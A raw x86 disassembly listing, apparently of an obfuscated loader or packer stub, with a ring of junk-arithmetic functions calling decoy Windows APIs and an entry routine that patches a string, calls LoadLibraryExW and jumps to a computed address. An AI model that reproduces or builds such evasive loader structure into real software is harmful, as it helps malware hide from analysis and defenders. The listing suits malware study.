0x004d0000:	movl	%edi, %edi	; from: 0x004d0259(MAY)
0x004d0002:	pushl	%ebp
0x004d0003:	movl	%esp, %ebp
0x004d0005:	subl	$0x3c, %esp
0x004d0008:	leal	0x134(%esi), %edx
0x004d000e:	sbbl	$0xffffffd9, 0x68(%edx)
0x004d0012:	pushl	%edx
0x004d0013:	pushl	%ebx
0x004d0014:	pushl	0x194(%edx)
0x004d001a:	pushl	0x8c(%edx)
0x004d0020:	pushl	0xa8(%edx)
0x004d0026:	call	0x004d09e4	; targets: 0x004d09e4(MAY)
0x004d0050:	movl	%edi, %edi	; from: 0x004d0919(MAY)
0x004d0052:	pushl	%ebp
0x004d0053:	movl	%esp, %ebp
0x004d0055:	subl	$0x1c, %esp
0x004d0058:	movl	$0x4d3130, %esi
0x004d005d:	sbbl	%ecx, %ebx
0x004d005f:	leal	-304(%esi), %ebx
0x004d0060:	sahf		; from: 0x004d006e(MAY)
0x004d0061:	sarb	%dh
0x004d0065:	pushl	%ebx
0x004d0066:	call	GetModuleHandleA@kernel32.dll	; targets: 0xff000070(MAY)
0x004d006c:	testl	%eax, %eax
0x004d006e:	jne	0x004d0060	; targets: 0x004d0070(MAY), 0x004d0060(MAY)
0x004d0070:	pushl	%esi	; from: 0x004d006e(MAY)
0x004d0071:	pushl	%edi
0x004d0072:	pushl	%ebx
0x004d0073:	pushl	%ebx
0x004d0074:	call	0x004d05bc	; targets: 0x004d05bc(MAY)
0x004d0098:	movl	%edi, %edi	; from: 0x004d0385(MAY)
0x004d009a:	pushl	%ebp
0x004d009b:	movl	%esp, %ebp
0x004d009d:	subl	$0x24, %esp
0x004d00a0:	leal	0x004d3114, %esi
0x004d00a6:	addl	$0x5195, 0x9c(%esi)
0x004d00b0:	pushl	$0x0
0x004d00b2:	call	FindClose@kernel32.dll	; targets: 0xff000050(MAY)
0x004d00b8:	pushl	%esi
0x004d00b9:	pushl	%edx
0x004d00ba:	pushl	0xac(%esi)
0x004d00c0:	call	0x004d0408	; targets: 0x004d0408(MAY)
0x004d00e0:	movl	%edi, %edi	; from: 0x004d0bcc(MAY)
0x004d00e2:	pushl	%ebp
0x004d00e3:	movl	%esp, %ebp
0x004d00e5:	subl	$0x5c, %esp
0x004d00e8:	leal	-192(%edi), %ebx
0x004d00ee:	addl	-16(%ebp), %ecx
0x004d00f1:	pushl	%ebx
0x004d00f2:	pushl	0x1f0(%ebx)
0x004d00f8:	pushl	%esi
0x004d00f9:	pushl	%edi
0x004d00fa:	call	0x004d0304	; targets: 0x004d0304(MAY)
0x004d0120:	movl	%edi, %edi	; from: 0x004d0499(MAY)
0x004d0122:	pushl	%ebp
0x004d0123:	movl	%esp, %ebp
0x004d0125:	subl	$0x38, %esp
0x004d0128:	leal	0x24(%ebx), %esi
0x004d012b:	adcl	%edx, -48(%ebp)
0x004d012e:	pushl	%esi
0x004d012f:	pushl	0x38(%esi)
0x004d0132:	pushl	%eax
0x004d0133:	pushl	0x60(%esi)
0x004d0136:	call	0x004d0b64	; targets: 0x004d0b64(MAY)
0x004d0154:	movl	%edi, %edi	; from: 0x004d04ea(MAY)
0x004d0156:	pushl	%ebp
0x004d0157:	movl	%esp, %ebp
0x004d0159:	subl	$0x50, %esp
0x004d015c:	leal	0x3c(%edi), %ecx
0x004d015f:	xorl	$0x2fc, %ebx
0x004d0165:	pushl	%ecx
0x004d0166:	pushl	$0x0
0x004d0168:	call	GetDC@user32.dll	; targets: 0xff0000c0(MAY)
0x004d016e:	popl	%ecx
0x004d016f:	pushl	%ecx
0x004d0170:	pushl	0x118(%ecx)
0x004d0176:	pushl	%edi
0x004d0177:	pushl	%eax
0x004d0178:	pushl	%edx
0x004d0179:	call	0x004d0aec	; targets: 0x004d0aec(MAY)
0x004d0194:	movl	%edi, %edi	; from: 0x004d028f(MAY)
0x004d0196:	pushl	%ebp
0x004d0197:	movl	%esp, %ebp
0x004d0199:	subl	$0x44, %esp
0x004d019c:	leal	-184(%esi), %edi
0x004d01a2:	addl	-52(%ebp), %ecx
0x004d01a5:	pushl	%edi
0x004d01a6:	pushl	0x1f0(%edi)
0x004d01ac:	pushl	%edx
0x004d01ad:	pushl	0x98(%edi)
0x004d01b3:	call	0x004d0a68	; targets: 0x004d0a68(MAY)
0x004d01ec:	movl	%edi, %edi	; from: 0x004d073b(MAY)
0x004d01ee:	pushl	%ebp
0x004d01ef:	movl	%esp, %ebp
0x004d01f1:	subl	$0x24, %esp
0x004d01f4:	leal	0xec(%esi), %ecx
0x004d01fa:	cmpl	$0x4d0d, %ecx
0x004d0200:	jb	0x004d01ef	; targets: 0x004d0202(MAY)
0x004d0202:	pushl	%ecx	; from: 0x004d0200(MAY)
0x004d0203:	pushl	%esi
0x004d0204:	pushl	%esi
0x004d0205:	call	0x004d0444	; targets: 0x004d0444(MAY)
0x004d0240:	movl	%edi, %edi	; from: 0x004d05cf(MAY)
0x004d0242:	pushl	%ebp
0x004d0243:	movl	%esp, %ebp
0x004d0245:	subl	$0x4c, %esp
0x004d0248:	leal	-316(%edi), %esi
0x004d024e:	movl	%edi, %ecx
0x004d0250:	call	GetACP@kernel32.dll	; targets: 0xff0000b0(MAY)
0x004d0256:	pushl	%esi
0x004d0257:	pushl	%eax
0x004d0258:	pushl	%edx
0x004d0259:	call	0x004d0000	; targets: 0x004d0000(MAY)
0x004d0274:	movl	%edi, %edi	; from: 0x004d07fe(MAY)
0x004d0276:	pushl	%ebp
0x004d0277:	movl	%esp, %ebp
0x004d0279:	subl	$0x5c, %esp
0x004d027c:	leal	0x84(%eax), %esi
0x004d0282:	xorl	%esi, -24(%ebp)
0x004d0285:	pushl	%esi
0x004d0286:	pushl	0x164(%esi)
0x004d028c:	pushl	0x70(%esi)
0x004d028f:	call	0x004d0194	; targets: 0x004d0194(MAY)
0x004d02b8:	movl	%edi, %edi	; from: 0x004d0897(MAY)
0x004d02ba:	pushl	%ebp
0x004d02bb:	movl	%esp, %ebp
0x004d02bd:	subl	$0x38, %esp
0x004d02c0:	movl	$0x4d3198, %ecx
0x004d02c5:	xorl	$0xffff89dd, %esi
0x004d02cb:	pushl	%ecx
0x004d02cc:	pushl	$0x0
0x004d02ce:	call	Sleep@kernel32.dll	; targets: 0xff000200(MAY)
0x004d02d4:	popl	%ecx
0x004d02d5:	pushl	%ecx
0x004d02d6:	pushl	0x50(%ecx)
0x004d02d9:	pushl	0x20(%ecx)
0x004d02dc:	pushl	%eax
0x004d02dd:	call	0x004d0390	; targets: 0x004d0390(MAY)
0x004d0304:	movl	%edi, %edi	; from: 0x004d00fa(MAY)
0x004d0306:	pushl	%ebp
0x004d0307:	movl	%esp, %ebp
0x004d0309:	subl	$0x2c, %esp
0x004d030c:	movl	$0x4d31f4, %edi
0x004d0311:	adcl	$0x6a8, -464(%edi)
0x004d031b:	pushl	$0x0
0x004d031d:	call	HeapDestroy@kernel32.dll	; targets: 0xff000220(MAY)
0x004d0323:	pushl	%edi
0x004d0324:	pushl	0x184(%edi)
0x004d032a:	pushl	0x7c(%edi)
0x004d032d:	pushl	0x108(%edi)
0x004d0333:	call	0x004d0828	; targets: 0x004d0828(MAY)

start:
0x004d034c:	pushl	$0x0
0x004d034e:	call	SetLastError@kernel32.dll	; targets: 0xff000120(MAY)
0x004d0354:	pushl	$0x0
0x004d0356:	call	Sleep@kernel32.dll	; targets: 0xff000200(MAY)
0x004d035c:	pushl	$0x2
0x004d035e:	xorl	%eax, %eax
0x004d0360:	leal	0x4d3200(,%eax,2), %eax
0x004d0367:	pushl	$0x0
0x004d0369:	leal	0xc(%eax), %ecx
0x004d036c:	addb	$0xffffffb0, (%ecx)
0x004d036f:	pushl	%eax
0x004d0370:	nop	
0x004d0371:	call	LoadLibraryExW@kernel32.dll	; targets: 0xff000030(MAY)
0x004d0377:	leal	0x3b(%eax), %edx
0x004d037a:	movl	(%edx), %ecx
0x004d037c:	movl	0x28(%eax,%ecx), %eax
0x004d0380:	movb	$0x40, %ah
0x004d0382:	pusha	
0x004d0383:	cmpb	%ah, %al
0x004d0385:	ja	0x004d0098	; targets: 0x004d0098(MAY), 0x004d038b(MAY)
0x004d038b:	popa		; from: 0x004d0385(MAY)
0x004d038c:	ret	; targets: 0xfee70000(MAY)

0x004d0390:	movl	%edi, %edi	; from: 0x004d02dd(MAY)
0x004d0392:	pushl	%ebp
0x004d0393:	movl	%esp, %ebp
0x004d0395:	subl	$0x1c, %esp
0x004d0398:	movl	$0x4d30cc, %edx
0x004d039d:	movl	%eax, 0x30(%edx)
0x004d03a0:	pushl	%edx
0x004d03a1:	pushl	0x50(%edx)
0x004d03a4:	pushl	0x38(%edx)
0x004d03a7:	call	0x004d0b30	; targets: 0x004d0b30(MAY)
0x004d03cc:	movl	%edi, %edi	; from: 0x004d054c(MAY)
0x004d03ce:	pushl	%ebp
0x004d03cf:	movl	%esp, %ebp
0x004d03d1:	subl	$0x30, %esp
0x004d03d4:	leal	-44(%ecx), %edx
0x004d03d7:	xorl	%esi, -8(%ebp)
0x004d03da:	pushl	%edx
0x004d03db:	movl	$0x0, %eax
0x004d03e0:	pushl	%eax
0x004d03e1:	call	FindClose@kernel32.dll	; targets: 0xff000050(MAY)
0x004d03e7:	popl	%edx
0x004d03e8:	pushl	%edx
0x004d03e9:	pushl	%ebx
0x004d03ea:	pushl	%eax
0x004d03eb:	call	0x004d07e0	; targets: 0x004d07e0(MAY)
0x004d0408:	movl	%edi, %edi	; from: 0x004d00c0(MAY)
0x004d040a:	pushl	%ebp
0x004d040b:	movl	%esp, %ebp
0x004d040d:	subl	$0x5c, %esp
0x004d0410:	leal	0x004d31b0, %eax
0x004d0416:	cmpl	$0x6943, %eax
0x004d041b:	jbe	0x004d040b	; targets: 0x004d041d(MAY)
0x004d041d:	pushl	%eax	; from: 0x004d041b(MAY)
0x004d041e:	pushl	$0x0
0x004d0420:	call	TlsGetValue@kernel32.dll	; targets: 0xff0000d0(MAY)
0x004d0426:	popl	%eax
0x004d0427:	pushl	%eax
0x004d0428:	pushl	%edi
0x004d0429:	pushl	%ebx
0x004d042a:	call	0x004d0c20	; targets: 0x004d0c20(MAY)
0x004d0444:	movl	%edi, %edi	; from: 0x004d0205(MAY)
0x004d0446:	pushl	%ebp
0x004d0447:	movl	%esp, %ebp
0x004d0449:	subl	$0x5c, %esp
0x004d044c:	leal	0x2c(%ecx), %esi
0x004d044f:	xorl	-60(%ebp), %edi
0x004d0452:	pushl	%esi
0x004d0453:	pushl	0xc(%esi)
0x004d0456:	pushl	0x1a4(%esi)
0x004d045c:	call	0x004d0750	; targets: 0x004d0750(MAY)
0x004d047c:	movl	%edi, %edi	; from: 0x004d0b4d(MAY)
0x004d047e:	pushl	%ebp
0x004d047f:	movl	%esp, %ebp
0x004d0481:	subl	$0x60, %esp
0x004d0484:	leal	0x004d317c, %ebx
0x004d048a:	sbbl	%esi, %edx
0x004d048c:	pushl	%ebx
0x004d048d:	pushl	0x148(%ebx)
0x004d0493:	pushl	0xe0(%ebx)
0x004d0499:	call	0x004d0120	; targets: 0x004d0120(MAY)
0x004d04c0:	movl	%edi, %edi	; from: 0x004d07b5(MAY)
0x004d04c2:	pushl	%ebp
0x004d04c3:	movl	%esp, %ebp
0x004d04c5:	subl	$0x1c, %esp
0x004d04c8:	leal	0x004d3040, %edi
0x004d04ce:	orl	%edi, %eax
0x004d04d0:	movl	$0x0, %esi
0x004d04d5:	pushl	%esi
0x004d04d6:	call	LocalUnlock@kernel32.dll	; targets: 0xff0001b0(MAY)
0x004d04dc:	pushl	%edi
0x004d04dd:	pushl	0x160(%edi)
0x004d04e3:	pushl	0x8(%edi)
0x004d04e6:	pushl	0x14(%edi)
0x004d04e9:	pushl	%edx
0x004d04ea:	call	0x004d0154	; targets: 0x004d0154(MAY)
0x004d0500:	movl	%edi, %edi	; from: 0x004d0acd(MAY)
0x004d0502:	pushl	%ebp
0x004d0503:	movl	%esp, %ebp
0x004d0505:	subl	$0x2c, %esp
0x004d0508:	leal	0x004d31c4, %edi
0x004d050e:	movl	-8(%ebp), %esi
0x004d0511:	pushl	$0x0
0x004d0513:	call	TlsGetValue@kernel32.dll	; targets: 0xff0000d0(MAY)
0x004d0519:	pushl	%edi
0x004d051a:	pushl	%ebx
0x004d051b:	pushl	%esi
0x004d051c:	call	0x004d05f8	; targets: 0x004d05f8(MAY)
0x004d0534:	movl	%edi, %edi	; from: 0x004d0aff(MAY)
0x004d0536:	pushl	%ebp
0x004d0537:	movl	%esp, %ebp
0x004d0539:	subl	$0x44, %esp
0x004d053c:	leal	-84(%eax), %ecx
0x004d053f:	movl	%ecx, -48(%ebp)
0x004d0542:	pushl	%ecx
0x004d0543:	pushl	0x1b4(%ecx)
0x004d0549:	pushl	%esi
0x004d054a:	pushl	%edi
0x004d054b:	pushl	%esi
0x004d054c:	call	0x004d03cc	; targets: 0x004d03cc(MAY)
0x004d057c:	movl	%edi, %edi	; from: 0x004d09c8(MAY)
0x004d057e:	pushl	%ebp
0x004d057f:	movl	%esp, %ebp
0x004d0581:	subl	$0x54, %esp
0x004d0584:	leal	0x1c8(%edx), %ebx
0x004d058a:	subl	%ebx, %eax
0x004d058c:	pushl	%ebx
0x004d058d:	pushl	%edx
0x004d058e:	pushl	0xe4(%ebx)
0x004d0594:	call	0x004d06d0	; targets: 0x004d06d0(MAY)
0x004d05bc:	movl	%edi, %edi	; from: 0x004d0074(MAY)
0x004d05be:	pushl	%ebp
0x004d05bf:	movl	%esp, %ebp
0x004d05c1:	subl	$0x4c, %esp
0x004d05c4:	movl	$0x4d3158, %edi
0x004d05c9:	orl	%ebx, -124(%edi)
0x004d05cc:	pushl	%edi
0x004d05cd:	pushl	%edx
0x004d05ce:	pushl	%esi
0x004d05cf:	call	0x004d0240	; targets: 0x004d0240(MAY)
0x004d05f8:	movl	%edi, %edi	; from: 0x004d051c(MAY)
0x004d05fa:	pushl	%ebp
0x004d05fb:	movl	%esp, %ebp
0x004d05fd:	subl	$0x24, %esp
0x004d0600:	leal	-340(%edi), %ebx
0x004d0606:	orl	$0x24, %ecx
0x004d0609:	pushl	$0x0
0x004d060b:	call	ReleaseMutex@kernel32.dll	; targets: 0xff000010(MAY)
0x004d0611:	pushl	%ebx
0x004d0612:	pushl	%ecx
0x004d0613:	pushl	0x38(%ebx)
0x004d0616:	pushl	0x1a4(%ebx)
0x004d061c:	pushl	0x1e8(%ebx)
0x004d0622:	call	0x004d08b4	; targets: 0x004d08b4(MAY)
0x004d0638:	movl	%edi, %edi	; from: 0x004d0a45(MAY)
0x004d063a:	pushl	%ebp
0x004d063b:	movl	%esp, %ebp
0x004d063d:	subl	$0x28, %esp
0x004d0640:	addl	$0xffffdc4f, -28(%ebp)
0x004d0647:	leal	0x004d3000, %ebx
0x004d064d:	movl	$0x6ac, %edi
0x004d0652:	pushl	%edi
0x004d0653:	pushl	$0x6ac
0x004d0658:	pushl	$0x40001
0x004d065d:	movl	$0x862985b6, %ecx
0x004d0662:	pushl	0x7a239a86(%ecx)
0x004d0668:	subl	$0x2, (%esp)
0x004d066c:	movl	$0x4d2034, %ecx
0x004d0671:	popl	(%ecx)
0x004d0673:	call	LoadLibraryExW@kernel32.dll	; targets: 0xff00007e(MAY)
0x004d06d0:	movl	%edi, %edi	; from: 0x004d0594(MAY)
0x004d06d2:	pushl	%ebp
0x004d06d3:	movl	%esp, %ebp
0x004d06d5:	subl	$0x40, %esp
0x004d06d8:	leal	0x004d3048, %eax
0x004d06de:	xorl	$0xffffffd3, %ecx
0x004d06e1:	pushl	%eax
0x004d06e2:	pushl	$0x0
0x004d06e4:	call	SetLastError@kernel32.dll	; targets: 0xff000120(MAY)
0x004d06ea:	popl	%eax
0x004d06eb:	pushl	%eax
0x004d06ec:	pushl	0x1dc(%eax)
0x004d06f2:	pushl	%ecx
0x004d06f3:	pushl	0x1a4(%eax)
0x004d06f9:	call	0x004d0ba0	; targets: 0x004d0ba0(MAY)
0x004d0718:	movl	%edi, %edi	; from: 0x004d0a7f(MAY)
0x004d071a:	pushl	%ebp
0x004d071b:	movl	%esp, %ebp
0x004d071d:	subl	$0x34, %esp
0x004d0720:	movl	$0x4d30c0, %esi
0x004d0725:	subl	%esi, %ecx
0x004d0727:	pushl	$0x0
0x004d0729:	call	ReleaseMutex@kernel32.dll	; targets: 0xff000010(MAY)
0x004d072f:	pushl	%esi
0x004d0730:	pushl	%edx
0x004d0731:	pushl	0x10(%esi)
0x004d0734:	pushl	%ebx
0x004d0735:	pushl	0x144(%esi)
0x004d073b:	call	0x004d01ec	; targets: 0x004d01ec(MAY)
0x004d0750:	movl	%edi, %edi	; from: 0x004d045c(MAY)
0x004d0752:	pushl	%ebp
0x004d0753:	movl	%esp, %ebp
0x004d0755:	subl	$0x40, %esp
0x004d0758:	leal	-104(%esi), %edi
0x004d075b:	addl	$0x4a12, %eax
0x004d0760:	pushl	%edi
0x004d0761:	pushl	%eax
0x004d0762:	pushl	%edx
0x004d0763:	pushl	%ecx
0x004d0764:	pushl	0x98(%edi)
0x004d076a:	call	0x004d0a20	; targets: 0x004d0a20(MAY)
0x004d0784:	movl	%edi, %edi	; from: 0x004d0a09(MAY)
0x004d0786:	pushl	%ebp
0x004d0787:	movl	%esp, %ebp
0x004d0789:	subl	$0x24, %esp
0x004d078c:	movl	$0x4d3000, %edx
0x004d0791:	andl	$0xce7, (%edx)
0x004d0797:	pushl	%edx
0x004d0798:	pushl	$0x0
0x004d079a:	call	Sleep@kernel32.dll	; targets: 0xff000200(MAY)
0x004d07a0:	popl	%edx
0x004d07a1:	pushl	%edx
0x004d07a2:	pushl	0x188(%edx)
0x004d07a8:	pushl	0xd8(%edx)
0x004d07ae:	pushl	%ecx
0x004d07af:	pushl	0x160(%edx)
0x004d07b5:	call	0x004d04c0	; targets: 0x004d04c0(MAY)
0x004d07e0:	movl	%edi, %edi	; from: 0x004d03eb(MAY)
0x004d07e2:	pushl	%ebp
0x004d07e3:	movl	%esp, %ebp
0x004d07e5:	subl	$0x5c, %esp
0x004d07e8:	movl	$0x4d3060, %eax
0x004d07ed:	xorl	%esi, -84(%ebp)
0x004d07f0:	pushl	%eax
0x004d07f1:	pushl	%edx
0x004d07f2:	pushl	0x134(%eax)
0x004d07f8:	pushl	0x1f8(%eax)
0x004d07fe:	call	0x004d0274	; targets: 0x004d0274(MAY)
0x004d0828:	movl	%edi, %edi	; from: 0x004d0333(MAY)
0x004d082a:	pushl	%ebp
0x004d082b:	movl	%esp, %ebp
0x004d082d:	subl	$0x4c, %esp
0x004d0830:	leal	0x004d3140, %ebx
0x004d0836:	movl	-40(%ebx), %edi
0x004d0839:	pushl	%ebx
0x004d083a:	pushl	%esi
0x004d083b:	pushl	(%ebx)
0x004d083d:	call	0x004d086c	; targets: 0x004d086c(MAY)
0x004d086c:	movl	%edi, %edi	; from: 0x004d083d(MAY)
0x004d086e:	pushl	%ebp
0x004d086f:	movl	%esp, %ebp
0x004d0871:	subl	$0x40, %esp
0x004d0874:	leal	0x004d3164, %esi
0x004d087a:	xorl	$0x16c8, -16(%ebp)
0x004d0881:	pushl	$0x0
0x004d0883:	call	UnmapViewOfFile@kernel32.dll	; targets: 0xff0000f0(MAY)
0x004d0889:	pushl	%esi
0x004d088a:	pushl	0x130(%esi)
0x004d0890:	pushl	%eax
0x004d0891:	pushl	0x134(%esi)
0x004d0897:	call	0x004d02b8	; targets: 0x004d02b8(MAY)
0x004d08b4:	movl	%edi, %edi	; from: 0x004d0622(MAY)
0x004d08b6:	pushl	%ebp
0x004d08b7:	movl	%esp, %ebp
0x004d08b9:	subl	$0x5c, %esp
0x004d08bc:	leal	0x004d30cc, %ecx
0x004d08c2:	subl	$0xffffffb5, 0x114(%ecx)
0x004d08c9:	pushl	%ecx
0x004d08ca:	pushl	0x164(%ecx)
0x004d08d0:	pushl	0x174(%ecx)
0x004d08d6:	pushl	%eax
0x004d08d7:	call	0x004d08fc	; targets: 0x004d08fc(MAY)
0x004d08fc:	movl	%edi, %edi	; from: 0x004d08d7(MAY)
0x004d08fe:	pushl	%ebp
0x004d08ff:	movl	%esp, %ebp
0x004d0901:	subl	$0x38, %esp
0x004d0904:	leal	0x004d30e0, %edx
0x004d090a:	andl	$0xffffffa5, -28(%edx)
0x004d090e:	pushl	%edx
0x004d090f:	pushl	%edi
0x004d0910:	pushl	0xe0(%edx)
0x004d0916:	pushl	0x24(%edx)
0x004d0919:	call	0x004d0050	; targets: 0x004d0050(MAY)
0x004d0944:	movl	%edi, %edi	; from: 0x004d0b8a(MAY)
0x004d0946:	pushl	%ebp
0x004d0947:	movl	%esp, %ebp
0x004d0949:	subl	$0x24, %esp
0x004d094c:	leal	0x004d3114, %eax
0x004d0952:	movl	$0x5e, 0x80(%eax)
0x004d095c:	pushl	%eax
0x004d095d:	movl	$0x0, %esi
0x004d0962:	pushl	%esi
0x004d0963:	call	Sleep@kernel32.dll	; targets: 0xff000200(MAY)
0x004d0969:	popl	%eax
0x004d096a:	pushl	%eax
0x004d096b:	pushl	%edi
0x004d096c:	pushl	0x114(%eax)
0x004d0972:	call	0x004d0be4	; targets: 0x004d0be4(MAY)
0x004d098c:	movl	%edi, %edi	; from: 0x004d0c3c(MAY)
0x004d098e:	pushl	%ebp
0x004d098f:	movl	%esp, %ebp
0x004d0991:	subl	$0x60, %esp
0x004d0994:	leal	0x004d301c, %edx
0x004d099a:	movl	$0xfffff096, 0x160(%edx)
0x004d09a4:	pushl	%edx
0x004d09a5:	leal	-28(%edx), %ecx	; from: 0x004d09b1(MAY)
0x004d09a8:	pushl	%ecx
0x004d09a9:	call	GetModuleHandleA@kernel32.dll	; targets: 0xff000070(MAY)
0x004d09af:	testl	%eax, %eax
0x004d09b1:	jne	0x004d09a5	; targets: 0x004d09b3(MAY), 0x004d09a5(MAY)
0x004d09b3:	popl	%edx	; from: 0x004d09b1(MAY)
0x004d09b4:	pushl	%edx
0x004d09b5:	pushl	0xe8(%edx)
0x004d09bb:	pushl	0x1f0(%edx)
0x004d09c1:	pushl	%eax
0x004d09c2:	pushl	0x1b8(%edx)
0x004d09c8:	call	0x004d057c	; targets: 0x004d057c(MAY)
0x004d09e4:	movl	%edi, %edi	; from: 0x004d0026(MAY)
0x004d09e6:	pushl	%ebp
0x004d09e7:	movl	%esp, %ebp
0x004d09e9:	subl	$0x4c, %esp
0x004d09ec:	leal	0xa0(%edx), %ecx
0x004d09f2:	subl	$0xffffffab, -436(%ecx)
0x004d09f9:	pushl	%ecx
0x004d09fa:	call	GetLastError@kernel32.dll	; targets: 0xff000270(MAY)
0x004d0a00:	popl	%ecx
0x004d0a01:	pushl	%ecx
0x004d0a02:	pushl	0x11c(%ecx)
0x004d0a08:	pushl	%esi
0x004d0a09:	call	0x004d0784	; targets: 0x004d0784(MAY)
0x004d0a20:	movl	%edi, %edi	; from: 0x004d076a(MAY)
0x004d0a22:	pushl	%ebp
0x004d0a23:	movl	%esp, %ebp
0x004d0a25:	subl	$0x5c, %esp
0x004d0a28:	leal	-316(%edi), %ecx
0x004d0a2e:	cmpl	$0x4b1f, %ecx
0x004d0a34:	je	0x004d0a23	; targets: 0x004d0a36(MAY)
0x004d0a36:	pushl	%ecx	; from: 0x004d0a34(MAY)
0x004d0a37:	pushl	$0x0
0x004d0a39:	call	GlobalFree@kernel32.dll	; targets: 0xff0001f0(MAY)
0x004d0a3f:	popl	%ecx
0x004d0a40:	pushl	%ecx
0x004d0a41:	pushl	%eax
0x004d0a42:	pushl	0x70(%ecx)
0x004d0a45:	call	0x004d0638	; targets: 0x004d0638(MAY)
0x004d0a68:	movl	%edi, %edi	; from: 0x004d01b3(MAY)
0x004d0a6a:	pushl	%ebp
0x004d0a6b:	movl	%esp, %ebp
0x004d0a6d:	subl	$0x20, %esp
0x004d0a70:	movl	$0x4d314c, %ebx
0x004d0a75:	andl	$0x170b, -12(%ebp)
0x004d0a7c:	pushl	%ebx
0x004d0a7d:	pushl	%eax
0x004d0a7e:	pushl	%edi
0x004d0a7f:	call	0x004d0718	; targets: 0x004d0718(MAY)
0x004d0aac:	movl	%edi, %edi	; from: 0x004d0bfd(MAY)
0x004d0aae:	pushl	%ebp
0x004d0aaf:	movl	%esp, %ebp
0x004d0ab1:	subl	$0x40, %esp
0x004d0ab4:	leal	-304(%ebx), %esi
0x004d0aba:	orl	%ecx, -44(%ebp)
0x004d0abd:	pushl	$0x0
0x004d0abf:	call	HeapDestroy@kernel32.dll	; targets: 0xff000220(MAY)
0x004d0ac5:	pushl	%esi
0x004d0ac6:	pushl	%edx
0x004d0ac7:	pushl	0x1e8(%esi)
0x004d0acd:	call	0x004d0500	; targets: 0x004d0500(MAY)
0x004d0aec:	movl	%edi, %edi	; from: 0x004d0179(MAY)
0x004d0aee:	pushl	%ebp
0x004d0aef:	movl	%esp, %ebp
0x004d0af1:	subl	$0x30, %esp
0x004d0af4:	movl	$0x4d30d0, %eax
0x004d0af9:	adcl	$0xffffff83, %ecx
0x004d0afc:	pushl	%eax
0x004d0afd:	pushl	%esi
0x004d0afe:	pushl	%ecx
0x004d0aff:	call	0x004d0534	; targets: 0x004d0534(MAY)
0x004d0b30:	movl	%edi, %edi	; from: 0x004d03a7(MAY)
0x004d0b32:	pushl	%ebp
0x004d0b33:	movl	%esp, %ebp
0x004d0b35:	subl	$0x54, %esp
0x004d0b38:	leal	0x5c(%edx), %esi
0x004d0b3b:	subl	%esi, -88(%esi)
0x004d0b3e:	pushl	$0x0
0x004d0b40:	call	HeapDestroy@kernel32.dll	; targets: 0xff000220(MAY)
0x004d0b46:	pushl	%esi
0x004d0b47:	pushl	0xc(%esi)
0x004d0b4a:	pushl	0x44(%esi)
0x004d0b4d:	call	0x004d047c	; targets: 0x004d047c(MAY)
0x004d0b64:	movl	%edi, %edi	; from: 0x004d0136(MAY)
0x004d0b66:	pushl	%ebp
0x004d0b67:	movl	%esp, %ebp
0x004d0b69:	subl	$0x28, %esp
0x004d0b6c:	leal	0x004d31e8, %ebx
0x004d0b72:	xorl	$0xffffffc6, %edx
0x004d0b75:	movl	$0x0, %eax
0x004d0b7a:	pushl	%eax
0x004d0b7b:	call	TlsGetValue@kernel32.dll	; targets: 0xff0000d0(MAY)
0x004d0b81:	pushl	%ebx
0x004d0b82:	pushl	0x17c(%ebx)
0x004d0b88:	pushl	%edi
0x004d0b89:	pushl	%ecx
0x004d0b8a:	call	0x004d0944	; targets: 0x004d0944(MAY)
0x004d0ba0:	movl	%edi, %edi	; from: 0x004d06f9(MAY)
0x004d0ba2:	pushl	%ebp
0x004d0ba3:	movl	%esp, %ebp
0x004d0ba5:	subl	$0x38, %esp
0x004d0ba8:	leal	0x004d30e0, %edi
0x004d0bae:	subl	$0x1878, 0x18(%edi)
0x004d0bb5:	movl	$0x0, %eax
0x004d0bba:	pushl	%eax
0x004d0bbb:	call	SetLastError@kernel32.dll	; targets: 0xff000120(MAY)
0x004d0bc1:	pushl	%edi
0x004d0bc2:	pushl	0xc(%edi)
0x004d0bc5:	pushl	%ecx
0x004d0bc6:	pushl	0x1f8(%edi)
0x004d0bcc:	call	0x004d00e0	; targets: 0x004d00e0(MAY)
0x004d0be4:	movl	%edi, %edi	; from: 0x004d0972(MAY)
0x004d0be6:	pushl	%ebp
0x004d0be7:	movl	%esp, %ebp
0x004d0be9:	subl	$0x44, %esp
0x004d0bec:	leal	0x24(%eax), %ebx
0x004d0bef:	subl	-48(%ebp), %eax
0x004d0bf2:	pushl	%ebx
0x004d0bf3:	pushl	0x138(%ebx)
0x004d0bf9:	pushl	%esi
0x004d0bfa:	pushl	0x70(%ebx)
0x004d0bfd:	call	0x004d0aac	; targets: 0x004d0aac(MAY)
0x004d0c20:	movl	%edi, %edi	; from: 0x004d042a(MAY)
0x004d0c22:	pushl	%ebp
0x004d0c23:	movl	%esp, %ebp
0x004d0c25:	subl	$0x1c, %esp
0x004d0c28:	movl	$0x4d309c, %esi
0x004d0c2d:	movl	%eax, -28(%ebp)
0x004d0c30:	pushl	%esi
0x004d0c31:	pushl	%edx
0x004d0c32:	pushl	0x20(%esi)
0x004d0c35:	pushl	%ebx
0x004d0c36:	pushl	0x190(%esi)
0x004d0c3c:	call	0x004d098c	; targets: 0x004d098c(MAY)
